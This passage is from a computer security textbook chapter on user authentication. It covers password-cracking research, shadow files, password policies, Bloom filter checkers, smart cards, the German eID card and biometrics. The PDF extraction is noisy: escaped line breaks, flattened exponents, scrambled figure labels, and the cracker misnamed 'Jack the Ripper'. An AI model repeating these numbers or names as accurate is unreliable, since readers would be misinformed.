password space to be searched.\\r\\nBut the best results have been achieved by studying examples of actual pass\\ufffewords in use. To develop techniques that are more efficient and effective than simple \\r\\ndictionary and brute-force attacks, researchers and hackers have studied the struc\\ufffeture of passwords. To do this, analysts need a large pool of real-word passwords to \\r\\nstudy, which they now have. The first big breakthrough came in late 2009, when an \\r\\nSQL injection attack against online games service RockYou.com exposed 32 million \\r\\nM03_STAL0611_04_GE_C03.indd 98 10/11/17 2:44 PM\\n\\n\\n3.2 / PASSWORD-BASED AUTHENTICATION 99\\r\\nplaintext passwords used by its members to log in to their accounts [TIMM10]. Since \\r\\nthen, numerous sets of leaked password files have become available for analysis.\\r\\nUsing large datasets of leaked passwords as training data, [WEIR09] reports \\r\\non the development of a probabilistic context-free grammar for password cracking. \\r\\nIn this approach, guesses are ordered according to their likelihood, based on the fre\\ufffequency of their character-class structures in the training data, as well as the frequency \\r\\nof their digit and symbol substrings. This approach has been shown to be efficient in \\r\\npassword cracking [KELL12, ZHAN10].\\r\\n[MAZU13] reports on an analysis of the passwords used by over 25,000 students \\r\\nat a research university with a complex password policy. The analysts used the pass\\ufffeword-cracking approach introduced in [WEIR09]. They used a database consisting \\r\\nof a collection of leaked password files, including the RockYou file. Figure 3.4 sum\\ufffemarizes a key result from the paper. The graph shows the percentage of passwords \\r\\nthat have been recovered as a function of the number of guesses. As can be seen, over \\r\\n10% of the passwords are recovered after only 1010 guesses. After 1013 guesses, almost \\r\\n40% of the passwords are recovered.\\r\\nPassword File Access Control\\r\\nOne way to thwart a password attack is to deny the opponent access to the password \\r\\nfile. If the hashed password portion of the file is accessible only by a privileged user, \\r\\nthen the opponent cannot read it without already knowing the password of a privi\\ufffeleged user. Often, the hashed passwords are kept in a separate file from the user IDs, \\r\\nreferred to as a shadow password file. Special attention is paid to making the shadow \\r\\nFigure 3.4 The Percentage of Passwords Guessed After a Given Number of Guesses\\r\\n0%\\r\\n104 107 1010 1013\\r\\n10%\\r\\nPercent guessed\\r\\nNumber of guesses\\r\\n20%\\r\\n30%\\r\\n40%\\r\\n50%\\r\\nM03_STAL0611_04_GE_C03.indd 99 10/11/17 2:44 PM\\n\\n\\n100 CHAPTER 3 / USER AUTHENTICATION\\r\\npassword file protected from unauthorized access. Although password file protection \\r\\nis certainly worthwhile, there remain vulnerabilities:\\r\\n• Many systems, including most UNIX systems, are susceptible to unanticipated \\r\\nbreak-ins. A hacker may be able to exploit a software vulnerability in the oper\\ufffeating system to bypass the access control system long enough to extract the \\r\\npassword file. Alternatively, the hacker may find a weakness in the file system \\r\\nor database management system that allows access to the file.\\r\\n• An accident of protection might render the password file readable, thus com\\ufffepromising all the accounts.\\r\\n• Some of the users have accounts on other machines in other protection domains, \\r\\nand they use the same password. Thus, if the passwords could be read by anyone \\r\\non one machine, a machine in another location might be compromised.\\r\\n• A lack of, or weakness in, physical security may provide opportunities for a \\r\\nhacker. Sometimes, there is a backup to the password file on an emergency \\r\\nrepair disk or archival disk. Access to this backup enables the attacker to read \\r\\nthe password file. Alternatively, a user may boot from a disk running another \\r\\noperating system such as Linux and access the file from this OS.\\r\\n• Instead of capturing the system password file, another approach to collecting \\r\\nuser IDs and passwords is through sniffing network traffic.\\r\\nThus, a password protection policy must complement access control measures with \\r\\ntechniques to force users to select passwords that are difficult to guess.\\r\\nPassword Selection Strategies\\r\\nWhen not constrained, many users choose a password that is too short or too \\r\\neasy to guess. At the other extreme, if users are assigned passwords consisting \\r\\nof eight randomly selected printable characters, password cracking is effectively \\r\\nimpossible. But it would be almost as impossible for most users to remember their \\r\\npasswords. Fortunately, even if we limit the password universe to strings of char\\ufffeacters that are reasonably memorable, the size of the universe is still too large to \\r\\npermit practical cracking. Our goal, then, is to eliminate guessable passwords while \\r\\nallowing the user to select a password that is memorable. Four basic techniques \\r\\nare in use:\\r\\n• User education\\r\\n• Computer-generated passwords\\r\\n• Reactive password checking\\r\\n• Complex password policy\\r\\nUsers can be told the importance of using hard-to-guess passwords and can be \\r\\nprovided with guidelines for selecting strong passwords. This user education strategy \\r\\nis unlikely to succeed at most installations, particularly where there is a large user \\r\\npopulation or a lot of turnover. Many users will simply ignore the guidelines. Others \\r\\nmay not be good judges of what is a strong password. For example, many users (mis\\ufffetakenly) believe that reversing a word or capitalizing the last letter makes a password \\r\\nunguessable.\\r\\nM03_STAL0611_04_GE_C03.indd 100 10/11/17 2:44 PM\\n\\n\\n3.2 / PASSWORD-BASED AUTHENTICATION 101\\r\\nNonetheless, it makes sense to provide users with guidelines on the selection \\r\\nof passwords. Perhaps the best approach is the following advice: A good technique \\r\\nfor choosing a password is to use the first letter of each word of a phrase. How\\ufffeever, do not pick a well-known phrase like “An apple a day keeps the doctor away” \\r\\n(Aaadktda). Instead, pick something like “My dog’s first name is Rex” (MdfniR) or \\r\\n“My sister Peg is 24 years old” (MsPi24yo). Studies have shown users can generally \\r\\nremember such passwords, but they are not susceptible to password guessing attacks \\r\\nbased on commonly used passwords.\\r\\nComputer-generated passwords also have problems. If the passwords are quite \\r\\nrandom in nature, users will not be able to remember them. Even if the password is \\r\\npronounceable, the user may have difficulty remembering it and so be tempted to write \\r\\nit down. In general, computer-generated password schemes have a history of poor accep\\ufffetance by users. FIPS 181 defines one of the best-designed automated password genera\\ufffetors. The standard includes not only a description of the approach but also a complete \\r\\nlisting of the C source code of the algorithm. The algorithm generates words by forming \\r\\npronounceable syllables and concatenating them to form a word. A random number gen\\ufffeerator produces a random stream of characters used to construct the syllables and words.\\r\\nA reactive password checking strategy is one in which the system periodically \\r\\nruns its own password cracker to find guessable passwords. The system cancels any \\r\\npasswords that are guessed and notifies the user. This tactic has a number of draw\\ufffebacks. First, it is resource intensive if the job is done right. Because a determined \\r\\nopponent who is able to steal a password file can devote full CPU time to the task for \\r\\nhours or even days, an effective reactive password checker is at a distinct disadvan\\ufffetage. Furthermore, any existing passwords remain vulnerable until the reactive pass\\ufffeword checker finds them. A good example is the openware Jack the Ripper password \\r\\ncracker (openwall.com/john/pro/), which works on a variety of operating systems.\\r\\nA promising approach to improved password security is a complex password \\r\\npolicy, or proactive password checker. In this scheme, a user is allowed to select his or \\r\\nher own password. However, at the time of selection, the system checks to see if the \\r\\npassword is allowable and, if not, rejects it. Such checkers are based on the philosophy \\r\\nthat, with sufficient guidance from the system, users can select memorable passwords \\r\\nfrom a fairly large password space that are not likely to be guessed in a dictionary attack.\\r\\nThe trick with a proactive password checker is to strike a balance between user \\r\\nacceptability and strength. If the system rejects too many passwords, users will com\\ufffeplain that it is too hard to select a password. If the system uses some simple algorithm \\r\\nto define what is acceptable, this provides guidance to password crackers to refine \\r\\ntheir guessing technique. In the remainder of this subsection, we will look at possible \\r\\napproaches to proactive password checking.\\r\\nRULE ENFORCEMENT The first approach is a simple system for rule enforcement. \\r\\nFor example, NIST SP 800-63-2 suggests the following alternative rules:\\r\\n• Password must have at least sixteen characters (basic16).\\r\\n• Password must have at least eight characters including an uppercase and \\r\\nlowercase letter, a symbol, and a digit. It may not contain a dictionary word \\r\\n(comprehensive8).\\r\\nAlthough NIST considers basic16 and comprehensive8 equivalent, [KELL12] \\r\\nfound that basic16 is superior against large numbers of guesses. Combined with a \\r\\nM03_STAL0611_04_GE_C03.indd 101 10/11/17 2:44 PM\\n\\n\\n102 CHAPTER 3 / USER AUTHENTICATION\\r\\nprior result that basic16 is also easier for users [KOMA11], this suggests basic16 is \\r\\nthe better policy choice.\\r\\nAlthough this approach is superior to simply educating users, it may not be suf\\ufffeficient to thwart password crackers. This scheme alerts crackers as to which passwords \\r\\nnot to try, but may still make it possible to do password cracking.\\r\\nThe process of rule enforcement can be automated by using a proactive pass\\ufffeword checker, such as the openware pam_passwdqc (openwall.com/passwdqc/), which \\r\\nenforces a variety of rules on passwords and is configurable by the system administrator.\\r\\nPASSWORD CHECKER Another possible procedure is simply to compile a large dic\\ufffetionary of possible “bad” passwords. When a user selects a password, the system \\r\\nchecks to make sure that it is not on the disapproved list. There are two problems \\r\\nwith this approach:\\r\\n• Space: The dictionary must be very large to be effective.\\r\\n• Time: The time required to search a large dictionary may itself be large. In addi\\ufffetion, to check for likely permutations of dictionary words, either those words \\r\\nmust be included in the dictionary, making it truly huge, or each search must \\r\\nalso involve considerable processing.\\r\\nBLOOM FILTER A technique [SPAF92a, SPAF92b] for developing an effective \\r\\nand efficient proactive password checker that is based on rejecting words on a list \\r\\nhas been implemented on a number of systems, including Linux. It is based on the \\r\\nuse of a Bloom filter [BLOO70]. To begin, we explain the operation of the Bloom \\r\\nfilter. A Bloom filter of order k consists of a set of k independent hash functions \\r\\nH1(x), H2(x), c , Hk(x), where each function maps a password into a hash value in \\r\\nthe range 0 to N - 1. That is,\\r\\nHi\\r\\n(Xj\\r\\n) = y 1 … i … k; 1 … j … D; 0 … y … N - 1\\r\\nwhere\\r\\nXj = jth word in password dictionary\\r\\nD = number of words in password dictionary\\r\\nThe following procedure is then applied to the dictionary:\\r\\n1. A hash table of N bits is defined, with all bits initially set to 0.\\r\\n2. For each password, its k hash values are calculated, and the corresponding bits \\r\\nin the hash table are set to 1. Thus, if Hi\\r\\n (Xj\\r\\n) = 67 for some (i, j), then the \\r\\nsixty-seventh bit of the hash table is set to 1; if the bit already has the value 1, \\r\\nit remains at 1.\\r\\nWhen a new password is presented to the checker, its k hash values are calcu\\ufffelated. If all the corresponding bits of the hash table are equal to 1, then the password \\r\\nis rejected. All passwords in the dictionary will be rejected. But there will also be \\r\\nsome “false positives” (i.e., passwords that are not in the dictionary but that produce \\r\\na match in the hash table). To see this, consider a scheme with two hash functions. \\r\\nSuppose the passwords undertaker and hulkhogan are in the dictionary, but xG%#jj98\\r\\nis not. Further suppose that\\r\\nM03_STAL0611_04_GE_C03.indd 102 10/11/17 2:44 PM\\n\\n\\n3.2 / PASSWORD-BASED AUTHENTICATION 103\\r\\nH1(undertaker) = 25 H1 (hulkhogan) = 83 H1 (xG%#jj98) = 665\\r\\nH2(undertaker) = 998 H2 (hulkhogan) = 665 H2 (xG%#jj98) = 998\\r\\nIf the password xG%#jj98 is presented to the system, it will be rejected even \\r\\nthough it is not in the dictionary. If there are too many such false positives, it will be \\r\\ndifficult for users to select passwords. Therefore, we would like to design the hash \\r\\nscheme to minimize false positives. It can be shown that the probability P of a false \\r\\npositive can be approximated by\\r\\nP ≈ (1 - e-kD/N)\\r\\nk = (1 - e-k/R)\\r\\nk\\r\\nor, equivalently,\\r\\nR ≈ -k\\r\\nln(1 - p1/k\\r\\n)\\r\\nwhere\\r\\nk = number of hash functions\\r\\nN = number of bits in hash table\\r\\nD = number of words in dictionary\\r\\nR = N/D, ratio of hash table size (bits) to dictionary size (words)\\r\\nFigure 3.5 plots P as a function of R for various values of k. Suppose we have a \\r\\ndictionary of 1 million words, and we wish to have a 0.01 probability of rejecting a \\r\\nFigure 3.5 Performance of Bloom Filter\\r\\n0.001\\r\\n0.01\\r\\n0.1\\r\\n1\\r\\nPr[false positive]\\r\\n0 5 10 15 20\\r\\nRatio of hash table size (bits) to dictionary size (words) \\r\\n4 hash functions\\r\\n2 hash functions\\r\\n6 hash functions\\r\\nM03_STAL0611_04_GE_C03.indd 103 10/11/17 2:44 PM\\n\\n\\n104 CHAPTER 3 / USER AUTHENTICATION\\r\\npassword not in the dictionary. If we choose six hash functions, the required ratio is \\r\\nR = 9.6. Therefore, we need a hash table of 9.6 * 106\\r\\n bits or about 1.2 MB of storage. \\r\\nIn contrast, storage of the entire dictionary would require on the order of 8 MB. Thus, \\r\\nwe achieve a compression of almost a factor of 7. Furthermore, password checking \\r\\ninvolves the straightforward calculation of six hash functions and is independent of \\r\\nthe size of the dictionary, whereas with the use of the full dictionary, there is substan\\ufffetial searching.2\\r\\n3.3 TOKEN-BASED AUTHENTICATION\\r\\nObjects that a user possesses for the purpose of user authentication are called tokens. \\r\\nIn this section, we examine two types of tokens that are widely used; these are cards \\r\\nthat have the appearance and size of bank cards (see Table 3.3).\\r\\nMemory Cards\\r\\nMemory cards can store but not process data. The most common such card is the bank \\r\\ncard with a magnetic stripe on the back. A magnetic stripe can store only a simple \\r\\nsecurity code, which can be read (and unfortunately reprogrammed) by an inexpensive \\r\\ncard reader. There are also memory cards that include an internal electronic memory.\\r\\nMemory cards can be used alone for physical access, such as a hotel room. For \\r\\nauthentication, a user provides both the memory card and some form of password \\r\\nor personal identification number (PIN). A typical application is an automatic teller \\r\\nmachine (ATM). The memory card, when combined with a PIN or password, provides \\r\\nsignificantly greater security than a password alone. An adversary must gain physical \\r\\npossession of the card (or be able to duplicate it) plus must gain knowledge of the \\r\\nPIN. Among the potential drawbacks NIST SP 800-12 (An Introduction to Computer \\r\\nSecurity: The NIST Handbook, October 1995) notes the following:\\r\\n• Requires special reader: This increases the cost of using the token and creates \\r\\nthe requirement to maintain the security of the reader’s hardware and software.\\r\\n2\\r\\nThe Bloom filter involves the use of probabilistic techniques. There is a small probability that some \\r\\npasswords not in the dictionary will be rejected. It is often the case in designing algorithms that the use of \\r\\nprobabilistic techniques results in a less time-consuming or less complex solution, or both.\\r\\nCard Type Defining Feature Example\\r\\nEmbossed Raised characters only, on front Old credit card\\r\\nMagnetic stripe Magnetic bar on back, characters on front Bank card\\r\\nMemory Electronic memory inside Prepaid phone card\\r\\nSmart\\r\\nContact\\r\\nContactless\\r\\nElectronic memory and processor inside\\r\\nElectrical contacts exposed on surface\\r\\nRadio antenna embedded inside\\r\\nBiometric ID card\\r\\nTable 3.3 Types of Cards Used as Tokens\\r\\nM03_STAL0611_04_GE_C03.indd 104 10/11/17 2:44 PM\\n\\n\\n3.3 / TOKEN-BASED AUTHENTICATION 105\\r\\n• Token loss: A lost token temporarily prevents its owner from gaining system \\r\\naccess. Thus, there is an administrative cost in replacing the lost token. In \\r\\naddition, if the token is found, stolen, or forged, then an adversary need only \\r\\ndetermine the PIN to gain unauthorized access.\\r\\n• User dissatisfaction: Although users may have no difficulty in accepting the use \\r\\nof a memory card for ATM access, its use for computer access may be deemed \\r\\ninconvenient.\\r\\nSmart Cards\\r\\nA wide variety of devices qualify as smart tokens. These can be categorized along \\r\\nfour dimensions that are not mutually exclusive:\\r\\n• Physical characteristics: Smart tokens include an embedded microprocessor. \\r\\nA smart token that looks like a bank card is called a smart card. Other smart \\r\\ntokens can look like calculators, keys, or other small portable objects.\\r\\n• User interface: Manual interfaces include a keypad and display for human/ \\r\\ntoken interaction.\\r\\n• Electronic interface: A smart card or other token requires an electronic inter\\ufffeface to communicate with a compatible reader/writer. A card may have one or \\r\\nboth of the following types of interface:\\r\\n— Contact: A contact smart card must be inserted into a smart card reader \\r\\nwith a direct connection to a conductive contact plate on the surface of the \\r\\ncard (typically gold plated). Transmission of commands, data, and card status \\r\\ntakes place over these physical contact points.\\r\\n— Contactless: A contactless card requires only close proximity to a reader. \\r\\nBoth the reader and the card have an antenna, and the two communicate \\r\\nusing radio frequencies. Most contactless cards also derive power for the \\r\\ninternal chip from this electromagnetic signal. The range is typically one-half \\r\\nto three inches for non-battery-powered cards, ideal for applications such as \\r\\nbuilding entry and payment that require a very fast card interface.\\r\\n• Authentication protocol: The purpose of a smart token is to provide a means \\r\\nfor user authentication. We can classify the authentication protocols used with \\r\\nsmart tokens into three categories:\\r\\n— Static:With a static protocol, the user authenticates himself or herself to the \\r\\ntoken then the token authenticates the user to the computer. The latter half \\r\\nof this protocol is similar to the operation of a memory token.\\r\\n— Dynamic password generator: In this case, the token generates a unique \\r\\npassword periodically (e.g., every minute). This password is then entered \\r\\ninto the computer system for authentication, either manually by the user \\r\\nor electronically via the token. The token and the computer system must be \\r\\ninitialized and kept synchronized so the computer knows the password that \\r\\nis current for this token.\\r\\nM03_STAL0611_04_GE_C03.indd 105 10/11/17 2:44 PM\\n\\n\\n106 CHAPTER 3 / USER AUTHENTICATION\\r\\n— Challenge-response: In this case, the computer system generates a challenge, \\r\\nsuch as a random string of numbers. The smart token generates a response \\r\\nbased on the challenge. For example, public-key cryptography could be used \\r\\nand the token could encrypt the challenge string with the token’s private key.\\r\\nFor user authentication, the most important category of smart token is the \\r\\nsmart card, which has the appearance of a credit card, has an electronic interface, and \\r\\nmay use any of the type of protocols just described. The remainder of this section \\r\\ndiscusses smart cards.\\r\\nA smart card contains within it an entire microprocessor, including processor, \\r\\nmemory, and I/O ports. Some versions incorporate a special co-processing circuit for \\r\\ncryptographic operation to speed the task of encoding and decoding messages or \\r\\ngenerating digital signatures to validate the information transferred. In some cards, \\r\\nthe I/O ports are directly accessible by a compatible reader by means of exposed \\r\\nelectrical contacts. Other cards rely instead on an embedded antenna for wireless \\r\\ncommunication with the reader.\\r\\nA typical smart card includes three types of memory. Read-only memory (ROM) \\r\\nstores data that does not change during the card’s life, such as the card number and \\r\\nthe cardholder’s name. Electrically erasable programmable ROM (EEPROM) holds \\r\\napplication data and programs, such as the protocols that the card can execute. It also \\r\\nholds data that may vary with time. For example, in a telephone card, the EEPROM \\r\\nholds the remaining talk time. Random access memory (RAM) holds temporary data \\r\\ngenerated when applications are executed.\\r\\nFigure 3.6 illustrates the typical interaction between a smart card and a reader \\r\\nor computer system. Each time the card is inserted into a reader, a reset is initiated \\r\\nby the reader to initialize parameters such as clock value. After the reset function \\r\\nis performed, the card responds with answer to reset (ATR) message. This message \\r\\ndefines the parameters and protocols that the card can use and the functions it can \\r\\nperform. The terminal may be able to change the protocol used and other parameters \\r\\nvia a protocol type selection (PTS) command. The card’s PTS response confirms \\r\\nthe protocols and parameters to be used. The terminal and card can now execute the \\r\\nprotocol to perform the desired application.\\r\\nElectronic Identity Cards\\r\\nAn application of increasing importance is the use of a smart card as a national \\r\\nidentity card for citizens. A national electronic identity (eID) card can serve the same \\r\\npurposes as other national ID cards, and similar cards such as a driver’s license, for \\r\\naccess to government and commercial services. In addition, an eID card can provide \\r\\nstronger proof of identity and be used in a wider variety of applications. In effect, an \\r\\neID card is a smart card that has been verified by the national government as valid \\r\\nand authentic.\\r\\nOne of the most recent and most advanced eID deployments is the German eID \\r\\ncard neuer Personalausweis [POLL12]. The card has human-readable data printed on \\r\\nits surface, including the following:\\r\\n• Personal data: Such as name, date of birth, and address; this is the type of \\r\\nprinted information found on passports and drivers’ licenses.\\r\\nM03_STAL0611_04_GE_C03.indd 106 10/11/17 2:44 PM\\n\\n\\n3.3 / TOKEN-BASED AUTHENTICATION 107\\r\\n• Document number: An alphanumerical nine-character unique identifier of \\r\\neach card.\\r\\n• Card access number (CAN): A six-digit decimal random number printed on the \\r\\nface of the card. This is used as a password, as explained subsequently.\\r\\n• Machine readable zone (MRZ): Three lines of human- and machine-readable \\r\\ntext on the back of the card. This may also be used as a password.\\r\\nEID FUNCTIONS The card has the following three separate electronic functions, each \\r\\nwith its own protected dataset (see Table 3.4):\\r\\n• ePass: This function is reserved for government use and stores a digital repre\\ufffesentation of the cardholder’s identity. This function is similar to, and may be \\r\\nused for, an electronic passport. Other government services may also use ePass. \\r\\nThe ePass function must be implemented on the card.\\r\\n• eID: This function is for general-purpose use in a variety of government and \\r\\ncommercial applications. The eID function stores an identity record that autho\\uffferized service can access with cardholder permission. Citizens choose whether \\r\\nthey want this function activated.\\r\\n• eSign:This optional function stores a private key and a certificate verifying the \\r\\nkey; it is used for generating a digital signature. A private sector trust center \\r\\nissues the certificate.\\r\\nFigure 3.6 Smart Card/Reader Exchange\\r\\nS dractram\\r\\nATR\\r\\nAPDU = Application protocol data unit\\r\\nATR = Answer to reset\\r\\nPTS = Protocol type selection\\r\\nSmart Card Activation\\r\\nEnd of Session\\r\\nProtocol negotiation PTS\\r\\nNegotiation Answer PTS\\r\\nCommand APDU\\r\\nResponse APDU\\r\\nM03_STAL0611_04_GE_C03.indd 107 10/11/17 2:44 PM\\n\\n\\n108 CHAPTER 3 / USER AUTHENTICATION\\r\\nThe ePass -function is an offline function. That is, it is not used over a network, \\r\\nbut is used in a situation where the cardholder presents the card for a particular ser\\ufffevice at that location, such as going through a passport control checkpoint.\\r\\nThe eID function can be used for both online and offline services. An exam\\ufffeple of an offline use is an inspection system. An inspection system is a terminal \\r\\nfor law enforcement checks, for example, by police or border control officers. An \\r\\ninspection system can read identifying information of the cardholder as well as bio\\ufffemetric information stored on the card, such as facial image and fingerprints. The \\r\\nbiometric information can be used to verify that the individual in possession of the \\r\\ncard is the actual cardholder.\\r\\nUser authentication is a good example of online use of the eID function. \\r\\nFigure 3.7 illustrates a Web-based scenario. To begin, an eID user visits a website and \\r\\nrequests a service that requires authentication. The Web site sends back a redirect \\r\\nmessage that forward an authentication request to an eID server. The eID server \\r\\nrequests that the user enter the PIN number for the eID card. Once the user has \\r\\ncorrectly entered the PIN, data can be exchanged between the eID card and the \\r\\nterminal reader in encrypted form. The server then engages in an authentication \\r\\nprotocol exchange with the microprocessor on the eID card. If the user is authenti\\ufffecated, the results are sent back to the user system to be redirected to the Web server \\r\\napplication.\\r\\nFunction Purpose PACE Password Data Uses\\r\\nePass (mandatory)\\r\\nAuthorized offline \\r\\ninspection systems \\r\\nread the data.\\r\\nCAN or MRZ\\r\\nFace image; two \\r\\nfingerprint images \\r\\n(optional); MRZ \\r\\ndata\\r\\nOffline biometric \\r\\nidentity verifica\\ufffetion reserved for \\r\\ngovernment access\\r\\neID (activation \\r\\noptional)\\r\\nOnline applica\\ufffetions read the data \\r\\nor access functions \\r\\nas authorized.\\r\\neID PIN Family and given \\r\\nnames; artistic name \\r\\nand doctoral degree: \\r\\ndate and place of \\r\\nbirth; address and \\r\\ncommunity ID;\\r\\nexpiration date\\r\\nIdentification; age \\r\\nverification; com\\ufffemunity ID verifi\\ufffecation; restricted \\r\\nidentification \\r\\n(pseudonym); \\r\\nrevocation query\\r\\nOffline inspection \\r\\nsystems read the \\r\\ndata and update \\r\\nthe address and \\r\\ncommunity ID.\\r\\nCAN or MRZ\\r\\neSign (certificate \\r\\noptional)\\r\\nA certification \\r\\nauthority installs \\r\\nthe signature \\r\\ncertificate online.\\r\\neID PIN\\r\\nSignature key;\\r\\nX.509 certificate\\r\\nElectronic \\r\\nCitizens make signature creation\\r\\nelectronic signa\\ufffeture with eSign \\r\\nPIN.\\r\\nCAN\\r\\nCAN = card access number\\r\\nMRZ = machine@readable zone\\r\\nPACE = password authenticated connection establishment\\r\\nPIN = personal identification number\\r\\nTable 3.4 Electronic Functions and Data for eID Cards\\r\\nM03_STAL0611_04_GE_C03.indd 108 10/11/17 2:44 PM\\n\\n\\n3.4 / BIOMETRIC AUTHENTICATION 109\\r\\nFor the preceding scenario, the appropriate software and hardware are required \\r\\non the user system. Software on the main user system includes functionality for \\r\\nrequesting and accepting the PIN number and for message redirection. The hard\\ufffeware required is an eID card reader. The card reader can be an external contact or \\r\\ncontactless reader or a contactless reader internal to the user system.\\r\\nPASSWORD AUTHENTICATED CONNECTION ESTABLISHMENT (PACE) Password \\r\\nAuthenticated Connection Establishment (PACE) ensures that the contactless RF \\r\\nchip in the eID card cannot be read without explicit access control. For online appli\\ufffecations, access to the card is established by the user entering the 6-digit PIN, which \\r\\nshould only be known to the holder of the card. For offline applications, either the \\r\\nMRZ printed on the back of the card or the six-digit card access number (CAN) \\r\\nprinted on the front is used.\\r\\n3.4 BIOMETRIC AUTHENTICATION\\r\\nA biometric authentication system attempts to authenticate an individual based on \\r\\nhis or her unique physical characteristics. These include static characteristics, such \\r\\nas fingerprints, hand geometry, facial characteristics, and retinal and iris patterns; \\r\\nFigure 3.7 User Authentication with eID\\r\\neID\\r\\nserver\\r\\nHost/application\\r\\nserver\\r\\n6. User enters PIN\\r\\n1. User requests service\\r\\n(e.g., via Web browser)\\r\\n4. Authentication request\\r\\n5. PIN request\\r\\n7. Authentication protocol exchange\\r\\n8. Authentication result for redirect\\r\\n2. Service request\\r\\n3. Redirect to eID message\\r\\n9. Authentication result forwarded\\r\\n10. Service granted\\r\\nM03_STAL0611_04_GE_C03.indd 109 10/11/17 2:44 PM\\n\\n\\n110 CHAPTER 3 / USER AUTHENTICATION\\r\\nand dynamic characteristics, such as voiceprint and signature. In essence, biomet\\uffferics is based on pattern recognition. Compared to passwords and tokens, biometric \\r\\nauthentication is both technically more complex and expensive. While it is used in a \\r\\nnumber of specific applications, biometrics has yet to mature as a standard tool for \\r\\nuser authentication to computer systems.\\r\\nPhysical Characteristics Used in Biometric Applications\\r\\nA number of different types of physical characteristics are either in use or under \\r\\nstudy for user authentication. The most common are the following:\\r\\n• Facial characteristics: Facial characteristics are the most common means \\r\\nof human-to-human identification; thus it is natural to consider them for \\r\\nidentification by computer. The most common approach is to define charac\\ufffeteristics based on relative location and shape of key facial features, such as \\r\\neyes, eyebrows, nose, lips, and chin shape. An alternative approach is to use an \\r\\ninfrared camera to produce a face thermogram that correlates with the underly\\ufffeing vascular system in the human face.\\r\\n• Fingerprints: Fingerprints have been used as a means of identification for cen\\ufffeturies, and the process has been systematized and automated particularly for \\r\\nlaw enforcement purposes. A fingerprint is the pattern of ridges and furrows on \\r\\nthe surface of the fingertip. Fingerprints are believed to be unique across the \\r\\nentire human population. In practice, automated fingerprint recognition and \\r\\nmatching system extract a number of features from the fingerprint for storage \\r\\nas a numerical surrogate for the full fingerprint pattern.\\r\\n• Hand geometry: Hand geometry systems identify features of the hand, includ\\ufffeing shape, and lengths and widths of fingers.\\r\\n• Retinal pattern: The pattern formed by veins beneath the retinal surface is \\r\\nunique and therefore suitable for identification. A retinal biometric system \\r\\nobtains a digital image of the retinal pattern by projecting a low-intensity beam \\r\\nof visual or infrared light into the eye.\\r\\n• Iris: Another unique physical characteristic is the detailed structure of the iris.\\r\\n• Signature: Each individual has a unique style of handwriting and this is reflected \\r\\nespecially in the signature, which is typically a frequently written sequence. \\r\\nHowever, multiple signature samples from a single individual will not be identi\\ufffecal. This complicates the task of developing a computer representation of the \\r\\nsignature that can be matched to future samples.\\r\\n• Voice: Whereas the signature style of an individual reflects not only the unique \\r\\nphysical attributes of the writer but also the writing habit that has developed, \\r\\nvoice patterns are more closely tied to the physical and anatomical characteris\\ufffetics of the speaker. Nevertheless, there is still a variation from sample to sample \\r\\nover time from the same speaker, complicating the biometric recognition task.\\r\\nFigure 3.8 gives a rough indication of the relative cost and accuracy of these \\r\\nbiometric measures. The concept of accuracy does not apply to user authentication \\r\\nschemes using smart cards or passwords. For example, if a user enters a password, \\r\\nit either matches exactly the password expected for that user or not. In the case of \\r\\nM03_STAL0611_04_GE_C03.indd 110 10/11/17 2:44 PM\\n\\n\\n3.4 / BIOMETRIC AUTHENTICATION 111\\r\\nbiometric parameters, the system instead must determine how closely a presented \\r\\nbiometric characteristic matches a stored characteristic. Before elaborating on the \\r\\nconcept of biometric accuracy, we need to have a general idea of how biometric \\r\\nsystems work.\\r\\nOperation of a Biometric Authentication System\\r\\nFigure 3.9 illustrates the operation of a biometric system. Each individual who is to be \\r\\nincluded in the database of authorized users must first be enrolled in the system. This \\r\\nis analogous to assigning a password to a user. For a biometric system, the user pres\\ufffeents a name and, typically, some type of password or PIN to the system. At the same \\r\\ntime, the system senses some biometric characteristic of this user (e.g., fingerprint \\r\\nof right index finger). The system digitizes the input then extracts a set of features \\r\\nthat can be stored as a number or set of numbers representing this unique biometric \\r\\ncharacteristic; this set of numbers is referred to as the user’s template. The user is now \\r\\nenrolled in the system, which maintains for the user a name (ID), perhaps a PIN or \\r\\npassword, and the biometric value.\\r\\nDepending on application, user authentication on a biometric system involves \\r\\neither verification or identification. Verification is analogous to a user logging on to \\r\\na system by using a memory card or smart card coupled with a password or PIN. For \\r\\nbiometric verification, the user enters a PIN and also uses a biometric sensor. The \\r\\nsystem extracts the corresponding feature and compares that to the template stored \\r\\nfor this user. If there is a match, then the system authenticates this user.\\r\\nFor an identification system, the individual uses the biometric sensor but pres\\ufffeents no additional information. The system then compares the presented template \\r\\nwith the set of stored templates. If there is a match, then this user is identified. Oth\\ufffeerwise, the user is rejected.\\r\\nBiometric Accuracy\\r\\nIn any biometric scheme, some physical characteristic of the individual is mapped \\r\\ninto a digital representation. For each individual, a single digital representation, or \\r\\nFigure 3.8 Cost Versus Accuracy of Various Biometric \\r\\nCharacteristics in User Authentication Schemes\\r\\nAccuracy\\r\\nCost\\r\\nHand\\r\\nSignature\\r\\nRetina\\r\\nIris\\r\\nFace Finger\\r\\nVoice\\r\\nM03_STAL0611_04_GE_C03.indd 111 10/11/17 2:44 PM\\n\\n\\n112 CHAPTER 3 / USER AUTHENTICATION\\r\\ntemplate, is stored in the computer. When the user is to be authenticated, the system \\r\\ncompares the stored template to the presented template. Given the complexities of \\r\\nphysical characteristics, we cannot expect that there will be an exact match between \\r\\nthe two templates. Rather, the system uses an algorithm to generate a matching \\r\\nscore (typically a single number) that quantifies the similarity between the input and \\r\\nthe stored template. To proceed with the discussion, we define the following terms. \\r\\nThe false match rate is the frequency with which biometric samples from different \\r\\nsources are erroneously assessed to be from the same source. The false nonmatch rate \\r\\nis the frequency with which samples from the same source are erroneously assessed \\r\\nto be from different sources.\\r\\nFigure 3.10 illustrates the dilemma posed to the system. If a single user is tested \\r\\nby the system numerous times, the matching score s will vary, with a probability \\r\\nFigure 3.9 A Generic Biometric System Enrollment creates an association \\r\\nbetween a user and the user’s biometric characteristics. Depending on the appli\\ufffecation, user authentication either involves verifying that a claimed user is the \\r\\nactual user or identifying an unknown user.\\r\\nBiometric\\r\\nsensor\\r\\nUser interface\\r\\nName (PIN)\\r\\n(a) Enrollment\\r\\nFeature\\r\\nextractor\\r\\nBiometric\\r\\nBiometric\\r\\ndatabase\\r\\nBiometric\\r\\ndatabase\\r\\nsensor\\r\\nUser interface\\r\\nName (PIN)\\r\\n(b) Verification\\r\\nTrue/false\\r\\nOne template\\r\\nFeature\\r\\nextractor\\r\\nFeature\\r\\nmatcher\\r\\nBiometric\\r\\nsensor\\r\\nUser interface\\r\\n(c) 